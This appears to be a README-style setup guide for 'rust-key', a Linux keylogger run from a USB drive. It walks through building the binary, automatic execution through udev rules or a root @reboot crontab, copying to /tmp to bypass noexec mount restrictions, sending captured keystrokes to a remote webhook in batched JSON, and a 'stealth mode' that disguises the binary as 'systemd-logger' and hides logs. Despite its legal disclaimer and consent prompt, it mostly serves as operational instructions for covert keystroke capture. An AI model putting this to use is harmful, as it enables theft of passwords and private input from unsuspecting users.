# USB Auto-run Setup Guide

This guide explains how to set up and use the USB auto-run script for the Rust keylogger.

## ⚠️ Legal Disclaimer

**This tool is for educational and authorized security testing purposes only.**

Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.

## Prerequisites

Before setting up the USB auto-run script, you need:

1. A USB drive/flash drive
2. The compiled `rust-key` binary (see main README for building instructions)
3. The `usb_autorun.sh` script (included in this repository)
4. A Linux system to run the keylogger on

## Setup Instructions

### Step 1: Build the Keylogger

First, build the release version of the keylogger:

```bash
cd /path/to/rust-key
cargo build --release
```

The compiled binary will be located at `target/release/rust-key`.

### Step 2: Prepare the USB Drive

1. **Format your USB drive** (if needed):
   - Use a common filesystem like ext4, FAT32, or exFAT
   - FAT32 is recommended for maximum compatibility
   - **Note**: The script is designed to work with FAT32/exFAT filesystems which don't support Unix permissions
   - The script automatically handles filesystem limitations when running from USB drives

2. **Find your USB mount point**:
   ```bash
   # Use lsblk to find your USB device and mount point
   lsblk
   
   # Common mount point locations:
   # - Ubuntu/Debian (modern): /media/$USER/VOLUME_NAME
   # - Fedora/RHEL: /run/media/$USER/VOLUME_NAME
   # - Older systems/manual: /mnt/usb or /media/usb
   
   # Set USB_MOUNT variable for convenience (replace 'john' with your username and 'MyUSB' with your drive name)
   # Example for Ubuntu/Debian: USB_MOUNT="/media/john/MyUSB"
   USB_MOUNT="/media/$USER/MyUSB"
   ```

3. **Copy files to the USB drive**:
   ```bash
   # Copy the binary
   cp target/release/rust-key $USB_MOUNT/rust-key
   
   # Copy the auto-run script
   cp usb_autorun.sh $USB_MOUNT/usb_autorun.sh
   
   # Make both executable
   chmod +x $USB_MOUNT/rust-key
   chmod +x $USB_MOUNT/usb_autorun.sh
   ```

4. **Your USB drive should now have**:
   ```
   $USB_MOUNT/
   ├── rust-key           (the compiled binary)
   └── usb_autorun.sh     (the auto-run script)
   ```

### Step 3: Optional - Set Up Automatic Execution

To automatically run the script when the USB drive is plugged in, you have several options:

#### Option 1: Manual Execution (Recommended for Testing)

Simply run the script manually after plugging in the USB drive:

```bash
# Navigate to the USB drive (use your actual mount point)
cd $USB_MOUNT

# Run the script
./usb_autorun.sh
```

The script will:
- Prompt you to confirm you understand this is a keylogger
- Offer an educational demonstration of how keyloggers capture passwords
- Ask for webhook configuration
- Start the keylogger with proper permissions

#### Option 2: Udev Rule (Advanced - Automatic USB Execution)

Create a udev rule that runs the script when the specific USB drive is detected.

**Important**: This project now includes a detailed example udev rule file. See:
- **`99-usb-autorun.rules.example`** - Complete example with multiple methods and detailed instructions

Quick setup:
1. Find your USB drive's vendor and product ID:
   ```bash
   lsusb
   ```
   
2. Copy and edit the example udev rule:
   ```bash
   sudo cp 99-usb-autorun.rules.example /etc/udev/rules.d/99-usb-autorun.rules
   sudo nano /etc/udev/rules.d/99-usb-autorun.rules
   ```
   
3. Edit the file with your actual values (vendor ID, product ID, mount path)

4. Reload udev rules:
   ```bash
   sudo udevadm control --reload-rules
   sudo udevadm trigger
   ```

**Note**: Modern Linux distributions often block automatic script execution from removable media for security reasons. The example file includes alternative methods using systemd.

#### Option 3: Crontab for Boot Execution (If USB is Always Plugged In)

If your USB drive is permanently or semi-permanently connected, you can use crontab to run the script at boot.

**See the new guide**: **`CRONTAB_SETUP.md`** - Complete crontab configuration guide

Quick setup:
```bash
# Edit root's crontab
sudo crontab -e

# Add this line (adjust path to your USB mount):
@reboot sleep 30 && /run/media/$USER/VOLUME_NAME/usb_autorun.sh
```

The `sleep 30` gives the system time to mount the USB drive.

For more details and troubleshooting, see `CRONTAB_SETUP.md`.

## Usage

### Running the Script

1. **Plug in the USB drive** to the target Linux system

2. **Navigate to the USB drive**:
   ```bash
   cd $USB_MOUNT  # Replace with your actual USB mount point
   ```

3. **Run the auto-run script**:
   ```bash
   ./usb_autorun.sh
   ```

4. **You will be prompted for**:
   - **User confirmation**: Acknowledge you understand this is a keylogger
   - **Educational demonstration** (optional): See how a keylogger captures input safely
   - **Sudo password**: The keylogger needs root access to read input devices
   - **Webhook URL** (optional): Enter a webhook URL to receive keystrokes remotely, or press Enter to skip

### What Happens When You Run the Script

1. The script displays a prominent warning about keylogger functionality
2. You must explicitly confirm you want to continue (type "yes")
3. Optionally, you can participate in an educational demonstration:
   - The script will ask you to enter a FAKE/TEST password
   - It shows you immediately what was captured
   - This demonstrates keylogger capabilities in a safe, controlled way
4. The script checks for sudo/root permissions and requests them if needed
   - If not running as root, it copies itself to `/tmp` to bypass any `noexec`/`nosuid` mount restrictions
5. It prompts you for an optional webhook URL
6. It detects if the USB drive is mounted with the `noexec` option
   - If `noexec` is detected, the binary is automatically copied to `/tmp` for execution
   - You'll see a message indicating this happened
7. It starts the keylogger in the background
8. A log directory is created on the USB drive: `logs/`
9. Keystrokes are saved to `logs/keylog.txt` on the USB drive (even if binary runs from `/tmp`)
10. If a webhook URL was provided, keystrokes are also sent there
11. A `stop_keylogger.sh` script is created for easy shutdown

### Stopping the Keylogger

To stop the keylogger, you have two options:

1. **Use the generated stop script** (recommended):
   ```bash
   cd $USB_MOUNT  # Replace with your actual USB mount point
   ./stop_keylogger.sh
   # or if chmod doesn't work on your filesystem:
   bash stop_keylogger.sh
   ```
   This script will:
   - Stop the keylogger process
   - Clean up any temporary files created in `/tmp` (if noexec workaround was used)

2. **Manually kill the process**:
   ```bash
   sudo kill <PID>
   # The PID is displayed when you start the keylogger
   ```

## Log Files

### Location

All logs are stored on the USB drive in the `logs/` directory:

```
$USB_MOUNT/
├── rust-key
├── usb_autorun.sh
├── stop_keylogger.sh  (created when you run the script)
└── logs/
    └── keylog.txt     (keystroke log)
```

### Format

The log file contains timestamped keystrokes with device information:

```
[2024-01-01 12:00:05.123] [USB Keyboard] Key: h
[2024-01-01 12:00:05.234] [USB Keyboard] Key: e
[2024-01-01 12:00:05.345] [USB Keyboard] Key: l
```

## Webhook Configuration

### Setting Up a Webhook

If you want to receive keystrokes remotely, you can use:

1. **Webhook.site** (for testing):
   - Visit https://webhook.site
   - Copy your unique URL
   - Enter it when prompted by the script

2. **Your own server**:
   - Set up an endpoint that accepts POST requests
   - Use HTTPS for security
   - The endpoint should accept JSON payloads in this format:
     ```json
     {
       "keystrokes": [
         {
           "timestamp": "2024-01-01 12:00:05.123",
           "device": "USB Keyboard",
           "key": "h"
         }
       ]
     }
     ```

### Webhook Behavior

- Keystrokes are batched (up to 20 at a time)
- Batches are sent every 2 seconds or when the batch is full
- This reduces network overhead and makes the communication more efficient

## Security Considerations

1. **Physical Security**: Keep your USB drive secure. Anyone with access can see the logs and configuration.

2. **Encryption**: Consider encrypting the USB drive to protect the keystroke logs.

3. **Webhook Security**: 
   - Always use HTTPS webhooks to encrypt data in transit
   - Use authentication on your webhook endpoint
   - Be aware that keystrokes contain sensitive information including passwords

4. **Log Management**:
   - Regularly clear or encrypt old logs
   - Be aware that log files grow over time
   - Set up log rotation if running for extended periods

5. **Legal Compliance**:
   - Only use on systems you own or have explicit written permission to monitor
   - Be aware of your local laws regarding keylogging and monitoring
   - Maintain proper documentation of authorization

## Troubleshooting

### "Permission denied" when accessing input devices

- **Solution**: Make sure you're running with sudo: `sudo ./usb_autorun.sh`

### "No input devices found"

- **Possible causes**:
  - Not running with sudo/root permissions
  - No keyboard devices connected
  - User not in the `input` group (if not using sudo)
  
- **Solution**: Ensure sudo is used or add user to input group:
  ```bash
  sudo usermod -a -G input $USER
  # Then log out and log back in
  ```

### Script doesn't auto-run when USB is plugged in

- **Causes**: Most modern Linux distributions block automatic script execution from removable media for security
- **Solution**: Run the script manually after plugging in the USB drive

### Webhook not receiving data

- **Check**:
  - Is the URL correct and accessible?
  - Is there network connectivity?
  - Check the keylogger output in `logs/keylog.txt` for error messages
  - Verify the webhook endpoint accepts POST requests with JSON

### Script fails when run from /run/media (USB mount point)

- **Causes**: 
  - USB drives mounted in `/run/media` or `/media` often have `noexec` mount option
  - The `noexec` option prevents direct execution of binaries from the mount point
  - FAT32/exFAT filesystems don't support Unix file permissions
  - Mounts may have `nosuid` option that affects sudo behavior within the mount
  
- **Solution**: 
  - The script has been updated to handle these scenarios automatically:
    - Detects `noexec` mounts and automatically copies the binary to `/tmp` for execution
    - Copies the script itself to `/tmp` before re-executing with sudo to bypass mount restrictions
    - Logs are still written to the USB drive's `logs/` directory
    - Gracefully handles `chmod` failures on FAT32/exFAT filesystems
  - No action required - the script handles all these scenarios automatically
  - If you see a message about `noexec` detection, this is normal and expected

### USB drive fills up

- **Solution**: 
  - Clear old log files regularly
  - Set up log rotation
  - Use webhook-only mode to minimize local storage

## Cleanup

To properly clean up after using the keylogger:

1. Stop the keylogger (using `stop_keylogger.sh` or `kill`)
2. Delete or secure the log files
3. Unmount the USB drive safely
4. Optionally, securely wipe the USB drive if needed

## Advanced Configuration

### Running in Stealth Mode

For maximum stealth (educational purposes only):

1. Rename the binary to something innocuous:
   ```bash
   mv rust-key systemd-logger
   ```

2. Modify the script to use the new name

3. Store logs in a hidden directory:
   ```bash
   mkdir -p .system-logs
   ```

### Custom Log Location

Edit the script to change the log location:

```bash
# Change this line:
mkdir -p "$SCRIPT_DIR/logs"

# To:
mkdir -p "/path/to/custom/location"
```

## Support

For issues, questions, or contributions:
- GitHub: https://github.com/LangerSword/rust-key
- Open an issue on GitHub for bug reports or feature requests

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Author

LangerSword
